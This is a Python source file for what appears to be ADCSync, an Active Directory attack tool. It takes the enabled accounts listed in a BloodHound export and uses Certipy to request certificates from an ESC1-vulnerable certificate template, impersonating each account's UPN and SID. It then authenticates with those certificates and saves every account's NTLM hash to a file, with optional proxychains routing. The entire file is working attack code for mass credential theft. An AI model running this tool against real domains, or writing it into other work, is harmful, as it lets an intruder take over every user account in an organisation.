import json
import os
import shutil
import subprocess
import logging
from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from typing import List
from rich.logging import RichHandler

# -------------------- FANCY LOGGING SETUP --------------------
LOG_FILE = "adcsync.log"

# Custom log format (File)
FILE_LOG_FORMAT = "%(asctime)s [%(levelname)s] - %(message)s"
DATE_FORMAT = "%Y-%m-%d %H:%M:%S"

# Custom log format (Console via RichHandler)
CONSOLE_LOG_FORMAT = "[%(levelname)s] - %(message)s"  # No timestamp

# Configure logging
logging.basicConfig(
    level=logging.DEBUG,  # Change to logging.INFO to reduce verbosity
    format=FILE_LOG_FORMAT,
    datefmt=DATE_FORMAT,
    handlers=[
        logging.FileHandler(LOG_FILE, mode="a"),  # File log (detailed)
        RichHandler(
            rich_tracebacks=True,
            markup=True,
            show_time=False,  # Remove timestamp from RichHandler
            show_level=True,  # Keep level names (INFO, SUCCESS, ERROR)
            show_path=False   # Hide file path details
        )
    ]
)

logger = logging.getLogger("ADCSync")

# Define a SUCCESS log level (Between INFO (20) and WARNING (30))
SUCCESS = 25
logging.addLevelName(SUCCESS, "SUCCESS")

def success(self, message, *args, **kwargs):
    if self.isEnabledFor(SUCCESS):
        self._log(SUCCESS, message, args, **kwargs)

logging.Logger.success = success  # Add method to Logger class

# Determine certipy client
certipy_client = shutil.which("certipy") or shutil.which("certipy-ad")
if not certipy_client:
    logger.error("❌ Certipy not found. Please install Certipy before running ADCSync.")
    exit(1)

@dataclass
class AccountInfo:
    spn: str
    domain: str
    sid: str
    username: str
    usernameLower: str
    pfx_filepath: str = ''

@dataclass
class AccountList:
    accounts: List[AccountInfo] = field(default_factory=list)

# Determine optimal thread count
# MAX_THREADS = min(32, os.cpu_count() * 2)
MAX_THREADS = 10

def get_json_data(json_file: str):
    """Load BloodHound JSON data."""
    if not os.path.exists(json_file):
        logger.error(f"❌ Error: File '{json_file}' not found.")
        exit(1)
    try:
        with open(json_file, 'r', encoding='utf-8') as file_obj:
            return json.load(file_obj)
    except json.JSONDecodeError:
        logger.error(f"❌ Error: The file '{json_file}' does not contain valid JSON.")
        exit(1)

def extract_accounts(data):
    """Extract accounts from JSON data."""
    accounts = AccountList()
    for item in data['nodes']:
        if item['props']['enabled']:
            name = str(item['props']['name']).lower()
            sid = item['props']['objectid']
            baseDomainAD = str(item['props']['domain']).lower()
            justUsernameLower = str(item['props']['samaccountname']).lower()
            justUsername = str(item['props']['samaccountname'])
            accounts.accounts.append(AccountInfo(spn=name, sid=sid, domain=baseDomainAD, username=justUsername, usernameLower=justUsernameLower))
    logger.success(f"✅ Found {len(accounts.accounts)} enabled accounts.")
    return accounts

def retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, debug):
    """Retrieve certificates using Certipy."""
    logger.info(f"🔄 Retrieving certificates for {len(accounts.accounts)} accounts...")

    def fetch_cert(account):
        upn = f"'{account.spn}'"
        sid = f"'{account.sid}'"
        if proxychains:
            command = [
                'proxychains4', certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                  '-template', template, '-upn', upn, '-dns', dc_fqdn, '-sid', sid
            ]
        else:
            command = [
                certipy_client, 'req', '-username', user, '-password', password, '-dc-ip', dc_ip, '-ca', ca_name, '-target', target,
                  '-template', template, '-upn', upn, '-sid', sid
            ]
        process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if "Failed to connect" in process.stdout:
            logger.error(f"⏳ Connection failed for account: {account.usernameLower}")
            return None
        return account, process.stdout, process.stderr

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(fetch_cert, account): account for account in accounts.accounts}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Retrieving Certificates"):
            result = future.result()
            if result:
                account, stdout, stderr = result
                if debug:
                    logging.debug(f"[Cert Fetch] {account.username} | {stdout.strip()} | {stderr.strip()}")

def authenticate_accounts(accounts, dc_ip, proxychains, output_file):
    """Authenticate using retrieved certificates."""

    def auth_account(account):
        if not account.pfx_filepath.endswith('.pfx'):
            return None
        if proxychains:
            command = ['proxychains4', certipy_client, 'auth', '-pfx', account.pfx_filepath, '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
        else:
            command = [certipy_client, 'auth', '-pfx', account.pfx_filepath,  '-username', account.usernameLower, '-domain', account.domain, '-dc-ip', dc_ip]
        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate()
        return account, stdout.strip()

    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = {executor.submit(auth_account, account): account for account in accounts.accounts}
        with open(output_file, 'a') as out_file:
            for future in tqdm(as_completed(futures), total=len(futures), desc="Authenticating"):
                result = future.result()
                if result:
                    account, output = result
                    if output:
                        try:
                            ntlm_hash = output.split('\n')[-1].split(': ')[1]
                            out_file.write(f'{account.domain}\\{account.username}::{ntlm_hash}::: (status=Enabled)\n')
                            logger.success(f"🔑 Successfully authenticated {account.username} - NTLM Hash stored")
                        except IndexError:
                            logger.error(f"❌ Error: Failed to parse NTLM hash for {account.username}: {output}")

def main(file, output, ca_name, dc_ip, dc_fqdn, user, password, template, target, debug, proxychains):
    """Main function to extract accounts, retrieve certificates, and authenticate."""

    data = get_json_data(file)
    accounts = extract_accounts(data)

    if not os.path.exists('certificates'):
        os.makedirs('certificates')

    retrieve_certificates(accounts, user, password, dc_ip, dc_fqdn, ca_name, target, template, proxychains, debug)

    if not os.path.exists('caches'):
        os.makedirs('caches')

    authenticate_accounts(accounts, dc_ip, proxychains, output)

    logger.success("🎉 ADCSync process completed successfully!")

if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser(description="Retrieve NTLM hashes via ADCS ESC1 technique.")
    parser.add_argument('-f', '--file', help='Input User List JSON file from Bloodhound', required=True)
    parser.add_argument('-o', '--output', help='NTLM Hash Output file', required=True)
    parser.add_argument('-ca-name', help='Certificate Authority', required=True)
    parser.add_argument('-dc-ip', help='IP Address of Domain Controller', required=True)
    parser.add_argument('-dc-fqdn', help='FQDN of Domain Controller', required=True)
    parser.add_argument('-u', '--user', help='Username', required=True)
    parser.add_argument('-p', '--password', help='Password', required=True)
    parser.add_argument('-template', help='Template Name vulnerable to ESC1', required=True)
    parser.add_argument('-target', help='CA FQDN', required=True)
    parser.add_argument('-debug', action='store_true', help='Show verbose debugging information')
    parser.add_argument('-proxychains', action='store_true', help='Use proxychains4')

    args = parser.parse_args()
    main(args.file, args.output, args.ca_name, args.dc_ip, args.dc_fqdn, args.user, args.password, args.template, args.target, args.debug, args.proxychains)

